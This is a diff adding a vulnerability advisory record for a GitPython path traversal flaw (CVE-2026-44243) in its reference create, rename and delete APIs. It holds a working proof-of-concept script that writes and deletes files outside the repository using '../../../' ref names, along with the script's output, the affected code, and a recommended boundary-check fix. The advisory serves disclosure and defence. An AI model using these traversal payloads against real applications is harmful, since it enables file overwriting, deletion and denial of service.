@@ -1,0 +1,337 @@
+advisory_id: GHSA-7545-fcxq-7j24
+datasource_id: github_osv/GHSA-7545-fcxq-7j24
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-7545-fcxq-7j24/GHSA-7545-fcxq-7j24.json
+aliases:
+  - CVE-2026-44243
+summary: |
+  GitPython reference APIs has a path traversal vulnerability that allows arbitrary file write and delete outside the repository
+  ## 🧾 Summary
+
+  A vulnerability in **GitPython** allows **attackers who can supply a crafted reference path to an application using GitPython** to **write, overwrite, move, or delete files outside the repository’s `.git` directory** via **insufficient validation of reference paths in reference creation, rename, and delete operations**.
+
+  ---
+
+  ## 📦 Affected Versions
+
+  * Affected: `<= 3.1.46` and current `main` (`3.1.47` in local checkout)
+
+  ---
+
+  ## 🧠 Details
+
+  ### Vulnerability Type
+
+  **Path Traversal leading to Arbitrary File Write and Arbitrary File Deletion**
+
+  ---
+
+  ### Root Cause
+
+  Reference paths are validated when they are resolved for reading, but are not consistently validated before filesystem write, rename, and delete operations.
+
+  `SymbolicReference._check_ref_name_valid()` rejects traversal sequences such as `..`, but `SymbolicReference.create`, `Reference.create`, `SymbolicReference.set_reference`, `SymbolicReference.rename`, and `SymbolicReference.delete` still construct filesystem paths from attacker-controlled ref names without enforcing repository boundaries.
+
+  ---
+
+  ### Affected Code
+
+  ```python
+  def set_reference(self, ref, logmsg=None):
+      ...
+      fpath = self.abspath
+      assure_directory_exists(fpath, is_file=True)
+
+      lfd = LockedFD(fpath)
+      fd = lfd.open(write=True, stream=True)
+      ...
+  ```
+
+  ```python
+  @classmethod
+  def delete(cls, repo, path):
+      full_ref_path = cls.to_full_path(path)
+      abs_path = os.path.join(repo.common_dir, full_ref_path)
+      if os.path.exists(abs_path):
+          os.remove(abs_path)
+  ```
+
+  ```python
+  def rename(self, new_path, force=False):
+      new_path = self.to_full_path(new_path)
+      new_abs_path = os.path.join(_git_dir(self.repo, new_path), new_path)
+      cur_abs_path = os.path.join(_git_dir(self.repo, self.path), self.path)
+      ...
+      os.rename(cur_abs_path, new_abs_path)
+  ```
+
+  ---
+
+  ### Attack Vector
+
+  **Local attack through application-controlled input passed into GitPython reference APIs**
+
+  ### Authentication Required
+
+  **None at the library boundary. In practice, exploitation requires the ability to influence ref names supplied by the consuming application.**
+
+  ---
+
+  ## 🧪 Proof of Concept
+
+  ### Setup
+
+  ```bash
+  pip install GitPython==3.1.46
+  python poc.py
+  ```
+
+  ---
+
+  ### Exploit
+
+  ```python
+  import shutil
+  from pathlib import Path
+
+  from git import Repo
+  from git.refs.reference import Reference
+  from git.refs.symbolic import SymbolicReference
+
+  base = Path("gp-ghsa-poc").resolve()
+  if base.exists():
+      shutil.rmtree(base)
+
+  repo_dir = base / "repo"
+  repo = Repo.init(repo_dir)
+
+  (repo_dir / "a.txt").write_text("init\n", encoding="utf-8")
+  repo.index.add(["a.txt"])
+  repo.index.commit("init")
+
+  outside_write = base / "outside_write.txt"
+  outside_delete = base / "outside_delete.txt"
+  outside_delete.write_text("DELETE ME\n", encoding="utf-8")
+
+  print(f"repo_dir       = {repo_dir}")
+  print(f"outside_write  = {outside_write}")
+  print(f"outside_delete = {outside_delete}")
+
+  Reference.create(repo, "../../../outside_write.txt", "HEAD")
+
+  print("\n[+] outside_write exists:", outside_write.exists())
+  if outside_write.exists():
+      print("[+] outside_write content:")
+      print(outside_write.read_text(encoding="utf-8"))
+
+  SymbolicReference.delete(repo, "../../../outside_delete.txt")
+
+  print("\n[+] outside_delete exists after delete:", outside_delete.exists())
+  ```
+
+  ---
+
+  ### Result
+
+  ```text
+  repo_dir       = ...\gp-ghsa-poc\repo
+  outside_write  = ...\gp-ghsa-poc\outside_write.txt
+  outside_delete = ...\gp-ghsa-poc\outside_delete.txt
+
+  [+] outside_write exists: True
+  [+] outside_write content:
+  <current HEAD commit SHA>
+
+  [+] outside_delete exists after delete: False
+  ```
+
+  ---
+
+  ## 💥 Impact
+
+  ### What can an attacker do?
+
+  * Create or overwrite files outside the repository metadata directory
+  * Delete attacker-chosen files reachable from the process permissions
+  * Corrupt application state or configuration files
+  * Cause denial of service by deleting or overwriting important files
+
+  ---
+
+  ### Security Impact
+
+  * **Confidentiality:** Low
+  * **Integrity:** High
+  * **Availability:** High
+
+  ---
+
+  ### Who is affected?
+
+  * Applications that expose GitPython reference operations to user-controlled input
+  * Git automation services, repository management backends, CI/CD helpers, and developer platforms
+  * Multi-user environments where one user can influence ref names processed on behalf of another workflow
+
+  ---
+
+  ## 🛠️ Mitigation / Fix
+
+  ### Recommended Fix
+
+  ```python
+  def _validate_ref_write_path(repo, path, *, for_git_dir=False):
+      SymbolicReference._check_ref_name_valid(path)
+
+      base = Path(repo.git_dir if for_git_dir else repo.common_dir).resolve()
+      target = (base / path).resolve()
+
+      if base not in [target, *target.parents]:
+          raise ValueError(f"Reference path escapes repository boundary: {path}")
+
+      return str(target)
+  ```
+
+  ```python
+  full_ref_path = cls.to_full_path(path)
+  _validate_ref_write_path(repo, full_ref_path)
+  ```
+impacted_packages:
+  - purl: pkg:pypi/gitpython
+    affected_versions: vers:pypi/<=3.1.47
+    fixed_versions: vers:pypi/3.1.48
+    affected_packages:
+      - pkg:pypi/gitpython@0.1.7
+      - pkg:pypi/gitpython@0.2.0b1
+      - pkg:pypi/gitpython@0.3.0b1
+      - pkg:pypi/gitpython@0.3.0b2
+      - pkg:pypi/gitpython@0.3.1b2
+      - pkg:pypi/gitpython@0.3.2rc1
+      - pkg:pypi/gitpython@0.3.2
+      - pkg:pypi/gitpython@0.3.2.1
+      - pkg:pypi/gitpython@0.3.3
+      - pkg:pypi/gitpython@0.3.4
+      - pkg:pypi/gitpython@0.3.5
+      - pkg:pypi/gitpython@0.3.6
+      - pkg:pypi/gitpython@0.3.7
+      - pkg:pypi/gitpython@1.0.0
+      - pkg:pypi/gitpython@1.0.1
+      - pkg:pypi/gitpython@1.0.2
+      - pkg:pypi/gitpython@2.0.0
+      - pkg:pypi/gitpython@2.0.1
+      - pkg:pypi/gitpython@2.0.2
+      - pkg:pypi/gitpython@2.0.3
+      - pkg:pypi/gitpython@2.0.4
+      - pkg:pypi/gitpython@2.0.5
+      - pkg:pypi/gitpython@2.0.6
+      - pkg:pypi/gitpython@2.0.7
+      - pkg:pypi/gitpython@2.0.8
+      - pkg:pypi/gitpython@2.0.9.dev0
+      - pkg:pypi/gitpython@2.0.9.dev1
+      - pkg:pypi/gitpython@2.0.9
+      - pkg:pypi/gitpython@2.1.0
+      - pkg:pypi/gitpython@2.1.1
+      - pkg:pypi/gitpython@2.1.2
+      - pkg:pypi/gitpython@2.1.3
+      - pkg:pypi/gitpython@2.1.4
+      - pkg:pypi/gitpython@2.1.5
+      - pkg:pypi/gitpython@2.1.6
+      - pkg:pypi/gitpython@2.1.7
+      - pkg:pypi/gitpython@2.1.8
+      - pkg:pypi/gitpython@2.1.9
+      - pkg:pypi/gitpython@2.1.10
+      - pkg:pypi/gitpython@2.1.11
+      - pkg:pypi/gitpython@2.1.12
+      - pkg:pypi/gitpython@2.1.13
+      - pkg:pypi/gitpython@2.1.14
+      - pkg:pypi/gitpython@2.1.15
+      - pkg:pypi/gitpython@3.0.0
+      - pkg:pypi/gitpython@3.0.1
+      - pkg:pypi/gitpython@3.0.2
+      - pkg:pypi/gitpython@3.0.3
+      - pkg:pypi/gitpython@3.0.4
+      - pkg:pypi/gitpython@3.0.5
+      - pkg:pypi/gitpython@3.0.6
+      - pkg:pypi/gitpython@3.0.7
+      - pkg:pypi/gitpython@3.0.8
+      - pkg:pypi/gitpython@3.0.9
+      - pkg:pypi/gitpython@3.1.0
+      - pkg:pypi/gitpython@3.1.1
+      - pkg:pypi/gitpython@3.1.2
+      - pkg:pypi/gitpython@3.1.3
+      - pkg:pypi/gitpython@3.1.4
+      - pkg:pypi/gitpython@3.1.5
+      - pkg:pypi/gitpython@3.1.6
+      - pkg:pypi/gitpython@3.1.7
+      - pkg:pypi/gitpython@3.1.8
+      - pkg:pypi/gitpython@3.1.9
+      - pkg:pypi/gitpython@3.1.10
+      - pkg:pypi/gitpython@3.1.11
+      - pkg:pypi/gitpython@3.1.12
+      - pkg:pypi/gitpython@3.1.13
+      - pkg:pypi/gitpython@3.1.14
+      - pkg:pypi/gitpython@3.1.15
+      - pkg:pypi/gitpython@3.1.16
+      - pkg:pypi/gitpython@3.1.17
+      - pkg:pypi/gitpython@3.1.18
+      - pkg:pypi/gitpython@3.1.19
+      - pkg:pypi/gitpython@3.1.20
+      - pkg:pypi/gitpython@3.1.22
+      - pkg:pypi/gitpython@3.1.23
+      - pkg:pypi/gitpython@3.1.24
+      - pkg:pypi/gitpython@3.1.25
+      - pkg:pypi/gitpython@3.1.26
+      - pkg:pypi/gitpython@3.1.27
+      - pkg:pypi/gitpython@3.1.28
+      - pkg:pypi/gitpython@3.1.29
+      - pkg:pypi/gitpython@3.1.30
+      - pkg:pypi/gitpython@3.1.31
+      - pkg:pypi/gitpython@3.1.32
+      - pkg:pypi/gitpython@3.1.33
+      - pkg:pypi/gitpython@3.1.34
+      - pkg:pypi/gitpython@3.1.35
+      - pkg:pypi/gitpython@3.1.36
+      - pkg:pypi/gitpython@3.1.37
+      - pkg:pypi/gitpython@3.1.38
+      - pkg:pypi/gitpython@3.1.40
+      - pkg:pypi/gitpython@3.1.41
+      - pkg:pypi/gitpython@3.1.42
+      - pkg:pypi/gitpython@3.1.43
+      - pkg:pypi/gitpython@3.1.44
+      - pkg:pypi/gitpython@3.1.45
+      - pkg:pypi/gitpython@3.1.46
+      - pkg:pypi/gitpython@3.1.47
+    fixed_packages:
+      - pkg:pypi/gitpython@3.1.48
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-7545-fcxq-7j24/GHSA-7545-fcxq-7j24.json
+  - score: '7.8'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-7545-fcxq-7j24/GHSA-7545-fcxq-7j24.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/gitpython-developers/GitPython
+    reference_type:
+    reference_id:
+  - url: https://github.com/gitpython-developers/GitPython/releases/tag/3.1.48
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-44243
+    reference_type:
+    reference_id: CVE-2026-44243
+  - url: https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24
+    reference_type:
+    reference_id: GHSA-7545-fcxq-7j24
+exploits: []
